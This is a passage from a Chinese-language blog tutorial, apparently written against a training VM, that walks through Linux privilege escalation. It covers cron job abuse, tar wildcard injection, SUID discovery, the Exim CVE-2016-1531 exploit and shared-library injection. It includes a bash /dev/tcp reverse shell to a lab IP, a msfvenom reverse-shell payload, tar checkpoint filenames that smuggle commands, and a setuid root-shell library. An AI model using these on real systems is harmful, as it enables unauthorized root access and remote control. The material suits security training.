          <a href="#4-将-overwrite-sh文件的内容替换为：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-将-overwrite-sh文件的内容替换为：" class="headerlink" title="4.将 overwrite.sh文件的内容替换为："></a>4.将 overwrite.sh文件的内容替换为：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.175.130/4444 0&gt;&amp;1</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630171650623.png" alt="image-20210630171650623"></p>

        <h3 id="5-kali上运行nc"   >
          <a href="#5-kali上运行nc" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-kali上运行nc" class="headerlink" title="5.kali上运行nc"></a>5.kali上运行nc</h3>
      <p>等待 cron jobs运行，返回root权限</p>

        <h2 id="路径环境变量"   >
          <a href="#路径环境变量" class="heading-link"><i class="fas fa-link"></i></a><a href="#路径环境变量" class="headerlink" title="路径环境变量"></a>路径环境变量</h2>
      <p>默认情况下，crontab环境变量设置为：<code>/usr/bin:/bin</code><br>路径变量可以覆盖在crontab文件中。<br>如果 cron jobs程序/脚本不使用绝对路径，并且其中一个 PATH 目录可由我们的用户编写，我们也许能够创建与 cron jobs同名的程序/脚本。</p>

        <h2 id="实操-9"   >
          <a href="#实操-9" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-9" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="1-查看system-wide-crontab的内容：-1"   >
          <a href="#1-查看system-wide-crontab的内容：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看system-wide-crontab的内容：-1" class="headerlink" title="1.查看system-wide crontab的内容："></a>1.查看system-wide crontab的内容：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630173619529.png" alt="image-20210630173619529"></p>
<p>请注意，/home/user目录（我们可以写信给）位于 PATH 变量的开头，并且第一个 cron jobs不使用绝对路径。</p>

        <h3 id="2-在-home-user-中创建文件-overwrite-sh，内容如下："   >
          <a href="#2-在-home-user-中创建文件-overwrite-sh，内容如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在-home-user-中创建文件-overwrite-sh，内容如下：" class="headerlink" title="2.在/home/user 中创建文件 overwrite.sh，内容如下："></a>2.在/home/user 中创建文件 overwrite.sh，内容如下：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash </span><br><span class="line">cp /bin/bash /tmp/rootbash </span><br><span class="line">chmod +s /tmp/rootbash</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630173757396.png" alt="image-20210630173757396"></p>

        <h3 id="3-加权"   >
          <a href="#3-加权" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-加权" class="headerlink" title="3.加权"></a>3.加权</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x /home/user/overwrite.sh</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-等待cronjob运行（此作业尤其每分钟运行一次）。"   >
          <a href="#4-等待cronjob运行（此作业尤其每分钟运行一次）。" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-等待cronjob运行（此作业尤其每分钟运行一次）。" class="headerlink" title="4.等待cronjob运行（此作业尤其每分钟运行一次）。"></a>4.等待cronjob运行（此作业尤其每分钟运行一次）。</h3>
      
        <h3 id="5-创建-tmp-rootbash文件"   >
          <a href="#5-创建-tmp-rootbash文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-创建-tmp-rootbash文件" class="headerlink" title="5.创建/tmp/rootbash文件"></a>5.创建/tmp/rootbash文件</h3>
      <p>执行它，使用与-p保存有效的UID</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash –p</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630174309759.png" alt="image-20210630174309759"></p>

        <h2 id="通配符"   >
          <a href="#通配符" class="heading-link"><i class="fas fa-link"></i></a><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h2>
      
        <h3 id="前言-11"   >
          <a href="#前言-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-11" class="headerlink" title="前言"></a>前言</h3>
      <p>当通配符字符 <code>* </code>作为参数的一部分提供给命令时，外壳将首先在通配符上执行 文件名扩展 （也称为 globbing）</p>
<p>此过程将用以空格分隔的文件列表替换通配符，以及当前目录中的目录名</p>
<p>执行命令：</p>
<figure class="highlight plaintext"><figcaption><span>*</span></figcaption><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo *</span><br></pre></td></tr></table></div></figure>


        <h3 id="通配符-amp-文件名"   >
          <a href="#通配符-amp-文件名" class="heading-link"><i class="fas fa-link"></i></a><a href="#通配符-amp-文件名" class="headerlink" title="通配符 &amp; 文件名"></a>通配符 &amp; 文件名</h3>
      <p>由于Linux 中的文件系统通常对文件名非常允许，并且文件名扩展在执行命令之前发生，因此可以通过创建具有这些名称的文件将命令行选项（例如 -h，-help）传递到命令</p>
<p>文件名不仅限于简单的选项<br>事实上，我们可以创建匹配复杂选项的文件名：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--option=key=value </span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>可以帮助确定命令是否有有命令行选项</p>

        <h3 id="实操-10"   >
          <a href="#实操-10" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-10" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-查看system-wide-crontab内容"   >
          <a href="#1-查看system-wide-crontab内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查看system-wide-crontab内容" class="headerlink" title="1.查看system-wide crontab内容:"></a>1.查看system-wide crontab内容:</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704104709412.png" alt="image-20210704104709412"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root /usr/local/bin/compress.sh</span><br></pre></td></tr></table></div></figure>


        <h4 id="2-查看文件的内容："   >
          <a href="#2-查看文件的内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-查看文件的内容：" class="headerlink" title="2.查看文件的内容："></a>2.查看文件的内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/local/bin/compress.sh </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704104806120.png" alt="image-20210704104806120"></p>
<p>注意：tar命令在 <code>/home/user</code>中使用通配符<code>*</code>运行</p>

        <h4 id="3-查阅参考"   >
          <a href="#3-查阅参考" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-查阅参考" class="headerlink" title="3.查阅参考"></a>3.查阅参考</h4>
      <p>显示tar具有命令行选项，可以用来运行其他命令作为检查点功能的一部分</p>

        <h4 id="4-使用msfvenom创建反向壳ELF有效载荷："   >
          <a href="#4-使用msfvenom创建反向壳ELF有效载荷：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用msfvenom创建反向壳ELF有效载荷：" class="headerlink" title="4.使用msfvenom创建反向壳ELF有效载荷："></a>4.使用msfvenom创建反向壳ELF有效载荷：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.175.161 LPORT=4444 -f elf -o shell.elf</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110051360.png" alt="image-20210704110051360"></p>

        <h4 id="5-搞文件到tar所在运行目录，并加权："   >
          <a href="#5-搞文件到tar所在运行目录，并加权：" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-搞文件到tar所在运行目录，并加权：" class="headerlink" title="5.搞文件到tar所在运行目录，并加权："></a>5.搞文件到tar所在运行目录，并加权：</h4>
      <p>python开启HTTP服务 </p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110127651.png" alt="image-20210704110127651"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110119309.png" alt="image-20210704110119309"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /home/user/shell.elf	</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110200778.png" alt="image-20210704110200778"></p>

        <h4 id="6-在-home-user目录中创建两个文件："   >
          <a href="#6-在-home-user目录中创建两个文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-在-home-user目录中创建两个文件：" class="headerlink" title="6.在/home/user目录中创建两个文件："></a>6.在/home/user目录中创建两个文件：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /home/user/--checkpoint=1 </span><br><span class="line"></span><br><span class="line">touch /home/user/--checkpoint-action=exec=shell.elf</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110307745.png" alt="image-20210704110307745"></p>

        <h4 id="7-kali运行nc等待cron-job"   >
          <a href="#7-kali运行nc等待cron-job" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-kali运行nc等待cron-job" class="headerlink" title="7.kali运行nc等待cron job"></a>7.kali运行nc等待cron job</h4>
      
        <h1 id="0x09-SUID-SGID可执行文件"   >
          <a href="#0x09-SUID-SGID可执行文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x09-SUID-SGID可执行文件" class="headerlink" title="0x09 SUID / SGID可执行文件"></a>0x09 SUID / SGID可执行文件</h1>
      
        <h2 id="前言-12"   >
          <a href="#前言-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-12" class="headerlink" title="前言"></a>前言</h2>
      <p>SUID文件使用文件所有者的权限执行。<br>SGID文件使用文件组的权限执行。<br>如果文件归root所有，则使用root特权执行，我们也许能够使用它来升级权限。</p>

        <h2 id="SUID-SGID文件"   >
          <a href="#SUID-SGID文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#SUID-SGID文件" class="headerlink" title="SUID / SGID文件"></a>SUID / SGID文件</h2>
      <p>我们可以使用以下<code>find</code>命令查找带有SUID 或 SGID 位集的文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630180510655.png" alt="image-20210630180510655"></p>

        <h2 id="外壳逃生序列-1"   >
          <a href="#外壳逃生序列-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#外壳逃生序列-1" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2>
      <p>正如我们能够使用壳逃生序列与程序运行通过sudo，我们可以做同样的SUID/SGID文件。<br>此处可以找到带有外壳逃生序列的程序列表 ：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gtfobins.github.io/" >https://gtfobins.github.io/</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>注意：默认情况下， 环境变量LD_PRELOAD &amp; LD_LIBRARY_PATH<br>这是在Linux禁用，因为它带来的明显安全风险！<br><strong>执行 SUID 文件时，这两个环境变量都会被忽略</strong></p>

        <h2 id="漏洞利用-1"   >
          <a href="#漏洞利用-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2>
      <p>某些程序安装 SUID 文件以帮助其操作。<br>正如作为root运行的服务可能有漏洞，我们可以利用root外壳，这些SUID文件也可以。<br>使用Searchsploit, Google, and GitHub可以找到漏洞</p>

        <h2 id="实操-11"   >
          <a href="#实操-11" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-11" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="1-在目标上查找SUID-SGID-文件-："   >
          <a href="#1-在目标上查找SUID-SGID-文件-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在目标上查找SUID-SGID-文件-：" class="headerlink" title="1.在目标上查找SUID/SGID 文件 ："></a>1.在目标上查找SUID/SGID 文件 ：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630180804891.png" alt="image-20210630180804891"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3 </span><br></pre></td></tr></table></div></figure>

<p>Exim 是一个邮件转账代理，但是它存在许多安全漏洞</p>

        <h3 id="2-版本确认："   >
          <a href="#2-版本确认：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-版本确认：" class="headerlink" title="2.版本确认："></a>2.版本确认：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/sbin/exim-4.84-3 --version </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630181009415.png" alt="image-20210630181009415"></p>

        <h3 id="3-漏洞寻找"   >
          <a href="#3-漏洞寻找" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-漏洞寻找" class="headerlink" title="3.漏洞寻找"></a>3.漏洞寻找</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit exim 4.84 </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630181114318.png" alt="image-20210630181114318"></p>
<p>这个：<code>linux/local/39535.sh</code></p>

        <h3 id="4-漏洞利用-CVE-2016-1531"   >
          <a href="#4-漏洞利用-CVE-2016-1531" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-漏洞利用-CVE-2016-1531" class="headerlink" title="4.漏洞利用(CVE-2016-1531)"></a>4.漏洞利用(CVE-2016-1531)</h3>
      <p>脚本复制到目标机器上。您可能需要从脚本中删除^M字符：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -e &quot;s/^M//&quot; 39535.sh &gt; a001.sh</span><br></pre></td></tr></table></div></figure>

<p>注意：要获得^M，必须按住Ctrl，然后连续按V和M。</p>

        <h3 id="5-加权"   >
          <a href="#5-加权" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-加权" class="headerlink" title="5.加权"></a>5.加权</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x a001.sh</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110724989.png" alt="image-20210704110724989"></p>

        <h3 id="6-执行脚本以获得根壳："   >
          <a href="#6-执行脚本以获得根壳：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-执行脚本以获得根壳：" class="headerlink" title="6.执行脚本以获得根壳："></a>6.执行脚本以获得根壳：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./a001.sh </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704110700833.png" alt="image-20210704110700833"></p>

        <h2 id="共享对象注入"   >
          <a href="#共享对象注入" class="heading-link"><i class="fas fa-link"></i></a><a href="#共享对象注入" class="headerlink" title="共享对象注入"></a>共享对象注入</h2>
      
        <h3 id="前言-13"   >
          <a href="#前言-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-13" class="headerlink" title="前言"></a>前言</h3>
      <p>执行程序时，它将尝试加载所需的共享对象。<br>通过使用称为strace 的程序，我们可以跟踪这些系统呼叫并确定是否未找到任何共享对象。<br>如果我们可以写信给程序尝试 打开的位置，我们可以创建一个共享对象，并在加载时生成root</p>

        <h3 id="实操-12"   >
          <a href="#实操-12" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-12" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-在目标上查找SUID-SGID文件-："   >
          <a href="#1-在目标上查找SUID-SGID文件-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在目标上查找SUID-SGID文件-：" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701115900118.png" alt="image-20210701115900118"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so</span><br></pre></td></tr></table></div></figure>

<p><code>suid-so</code>文件在root用户权限下执行</p>

        <h4 id="2-在SUID文件上运行分层："   >
          <a href="#2-在SUID文件上运行分层：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在SUID文件上运行分层：" class="headerlink" title="2.在SUID文件上运行分层："></a>2.在SUID文件上运行分层：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such  file&quot;</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704111607655.png" alt="image-20210704111607655"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such  file&quot;</span><br><span class="line">access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3</span><br><span class="line">access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)</span><br><span class="line">open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3</span><br><span class="line">open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)</span><br><span class="line">user@debian:~$ </span><br></pre></td></tr></table></div></figure>



<p>可以看到找不到共享对象 <code>libcalc.so</code>，程序正在查看用户的家庭目录，我们可以写东西给这个目录</p>

        <h4 id="3-创建-home-user-config目录"   >
          <a href="#3-创建-home-user-config目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-创建-home-user-config目录" class="headerlink" title="3.创建 /home/user/.config目录"></a>3.创建 /home/user/.config目录</h4>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112350458.png" alt="image-20210704112350458"></p>
<p>注意：这里查看的话 要查看隐藏文件夹命令</p>

        <h4 id="4-创建libcalc-c具有-以下-内容："   >
          <a href="#4-创建libcalc-c具有-以下-内容：" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-创建libcalc-c具有-以下-内容：" class="headerlink" title="4.创建libcalc.c具有 以下 内容："></a>4.创建<code>libcalc.c</code>具有 以下 内容：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">static void inject() __attribute__((constructor));</span><br><span class="line">void inject() &#123;</span><br><span class="line">setuid(0);</span><br><span class="line">system(&quot;/bin/bash -p&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h4 id="5-进行编译"   >
          <a href="#5-进行编译" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-进行编译" class="headerlink" title="5.进行编译"></a>5.进行编译</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112538615.png" alt="image-20210704112538615"></p>

        <h4 id="6-运行可执行的SUID以获得根壳："   >
          <a href="#6-运行可执行的SUID以获得根壳：" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-运行可执行的SUID以获得根壳：" class="headerlink" title="6.运行可执行的SUID以获得根壳："></a>6.运行可执行的SUID以获得根壳：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/suid-so</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210704112616418.png" alt="image-20210704112616418"></p>

        <h2 id="路径环境变量-1"   >
          <a href="#路径环境变量-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#路径环境变量-1" class="headerlink" title="路径环境变量"></a>路径环境变量</h2>
      
        <h3 id="前言-14"   >
          <a href="#前言-14" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-14" class="headerlink" title="前言"></a>前言</h3>
      <p>PATH 环境变量包含外壳应尝试查找程序的目录列表。<br>如果程序尝试执行其他程序，但只指定程序名称，而不是其完整（绝对）路径，则外壳将搜索 PATH 目录，直到找到为止。<br>由于用户完全控制其 PATH 变量，我们可以告诉外壳首先在目录中查找我们可以写到的程序。</p>

        <h3 id="查找易受攻击的程序"   >
          <a href="#查找易受攻击的程序" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找易受攻击的程序" class="headerlink" title="查找易受攻击的程序"></a>查找易受攻击的程序</h3>
      <p>如果程序尝试执行其他程序，该程序的名称可能嵌入到可执行文件中，作为string。<br>我们可以在可执行文件上运行strings以查找strings。<br>我们还可以使用策略(strace)来查看程序的执行情况。另一个称为”Itrace”的程序也可能有用。</p>

        <h4 id="对文件运行字符串："   >
          <a href="#对文件运行字符串：" class="heading-link"><i class="fas fa-link"></i></a><a href="#对文件运行字符串：" class="headerlink" title="对文件运行字符串："></a>对文件运行字符串：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /path/to/file	</span><br></pre></td></tr></table></div></figure>


        <h4 id="针对命令运行策略："   >
          <a href="#针对命令运行策略：" class="heading-link"><i class="fas fa-link"></i></a><a href="#针对命令运行策略：" class="headerlink" title="针对命令运行策略："></a>针对命令运行策略：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -v -f -e execve &lt;command&gt; 2&gt;&amp;1 | grep exec</span><br></pre></td></tr></table></div></figure>


        <h4 id="对命令运行-跟踪-："   >
          <a href="#对命令运行-跟踪-：" class="heading-link"><i class="fas fa-link"></i></a><a href="#对命令运行-跟踪-：" class="headerlink" title="对命令运行 跟踪 ："></a>对命令运行 跟踪 ：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace &lt;command&gt;</span><br></pre></td></tr></table></div></figure>


        <h3 id="实操-13"   >
          <a href="#实操-13" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-13" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="1-在目标上查找SUID-SGID文件-：-1"   >
          <a href="#1-在目标上查找SUID-SGID文件-：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在目标上查找SUID-SGID文件-：-1" class="headerlink" title="1.在目标上查找SUID/SGID文件 ："></a>1.在目标上查找SUID/SGID文件 ：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l &#123;&#125; \; 2&gt; /dev/null</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701171659145.png" alt="image-20210701171659145"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env </span><br></pre></td></tr></table></div></figure>

<p><code>suid-env</code>文件在root用户权限下执行</p>

        <h5 id="2-在SUID文件上运行stings："   >
          <a href="#2-在SUID文件上运行stings：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-在SUID文件上运行stings：" class="headerlink" title="2.在SUID文件上运行stings："></a>2.在SUID文件上运行stings：</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/local/bin/suid-env</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701173258438.png" alt="image-20210701173258438"></p>
<p>该文件可能正在尝试在没有完整路径的情况下运行服务程序。</p>

        <h4 id="3-我们可以用策略来验证这一点："   >
          <a href="#3-我们可以用策略来验证这一点：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-我们可以用策略来验证这一点：" class="headerlink" title="3.我们可以用策略来验证这一点："></a>3.我们可以用策略来验证这一点：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -v -f -e execve /usr/local/bin/suid-env 2&gt;&amp;1 | grep service</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210701172526881.png" alt="image-20210701172526881"></p>
